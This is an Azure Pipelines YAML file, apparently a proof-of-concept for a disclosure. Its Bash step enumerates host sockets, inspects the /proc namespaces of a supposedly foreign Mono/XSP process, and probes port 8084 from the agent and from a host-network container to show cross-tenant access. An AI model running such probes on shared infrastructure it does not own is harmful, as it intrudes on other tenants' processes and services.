# azure-pipelines.yml
trigger:
- main
pr:
- main

name: $(Date:yyyyMMdd)$(Rev:.r)

variables:
  # Hardcoding the target to localhost for this definitive proof.
  TARGET_URL: 'http://127.0.0.1:8084'

stages:
- stage: ConclusiveProof
  displayName: 'Conclusive Proof of Cross-Tenant Process & Network Access'
  jobs:
  - job: Linux_Proof_Of_Concept
    displayName: 'Linux: Conclusive Proof of Pre-existing Service Access'
    pool:
      vmImage: 'ubuntu-22.04'
    steps:
    - checkout: none

    - task: Bash@3
      displayName: "Capture Forensic Evidence of Cross-Tenant Process"
      inputs:
        targetType: inline
        script: |
          set -euo pipefail
          mkdir -p artifacts

          echo "### STEP 1: Identifying pre-existing services on the host ###"
          
          printf "=== Listening sockets (shows :8084 is active) ===\n" | tee artifacts/listeners.txt
          (ss -lntp || netstat -tnlp || true) | tee -a artifacts/listeners.txt
          
          printf "\n=== Identifying the Mono/XSP process running on the host ===\n" | tee artifacts/web-procs.txt
          ps -eo lstart,pid,user,cmd | grep -Ei 'mono.*xsp' | grep -v grep || true >> artifacts/web-procs.txt

          echo "--- Key Evidence: Listener on port 8084 ---"
          (ss -lntp || netstat -tnlp || true) | grep ':8084' | tee artifacts/listener-8084.txt || true

          echo "### STEP 2: Proving the service is accessible from the pipeline job ###"
          printf "\n=== Probing ${TARGET_URL} from the pipeline agent (headers only) ===\n" | tee artifacts/host-curl-headers.txt
          curl -sS -I --max-time 10 "${TARGET_URL}" >> artifacts/host-curl-headers.txt || true
          echo "--- Key Evidence: Response headers from host curl ---"
          grep -E '^HTTP/|^Server:' artifacts/host-curl-headers.txt || echo "No HTTP response from host curl."

          echo "### STEP 3: Proving the rogue process is NOT part of our job ###"
          XSP_PID="$(ps -eo pid,cmd | awk '/xsp4\.exe/ {print $1; exit}')"
          if [ -n "$XSP_PID" ]; then
            {
              echo "=== Mono/XSP Process Details (PID: $XSP_PID) ==="
              echo "--- cgroup ---"
              cat "/proc/$XSP_PID/cgroup" || true
              echo "--- namespaces ---"
              for n in mnt pid net uts ipc user cgroup; do
                printf "%s:\t" "$n"; readlink "/proc/$XSP_PID/ns/$n" || true
              done
            } | tee artifacts/xsp-ns.txt

            {
              echo -e "\n=== Our Pipeline Agent Process Details (/proc/self) ==="
              echo "--- cgroup ---"
              cat /proc/self/cgroup || true
              echo "--- namespaces ---"
              for n in mnt pid net uts ipc user cgroup; do
                printf "%s:\t" "$n"; readlink "/proc/self/ns/$n" || true
              done
            } | tee artifacts/self-ns.txt
            
            echo "--- Key Evidence: Namespace comparison proves processes are from different contexts ---"
            diff -u artifacts/xsp-ns.txt artifacts/self-ns.txt || true
          fi

          echo "### STEP 4: Proving the service is accessible from another container on the host ###"
          printf "\n=== Container proof: Accessing ${TARGET_URL} from --network=host ===\n" | tee artifacts/container-proof.txt
          docker run --rm --network=host alpine:latest sh -c '
            set -e
            apk add --no-cache curl >/dev/null
            echo "--- Container Network Config ---"
            ip addr || true
            echo "--- Probing Service from Container ---"
            curl -sS -I --max-time 10 "'"${TARGET_URL}"'" || true
          ' >> artifacts/container-proof.txt 2>&1 || true
          echo "--- Key Evidence: Response headers from container curl ---"
          grep -E '^HTTP/|^Server:' artifacts/container-proof.txt || echo "No HTTP response from container curl."

    - task: PublishPipelineArtifact@1
      displayName: 'Publish Conclusive Evidence Artifacts'
      inputs:
        targetPath: 'artifacts'
        artifact: 'conclusive-runner-proof'
      condition: always()
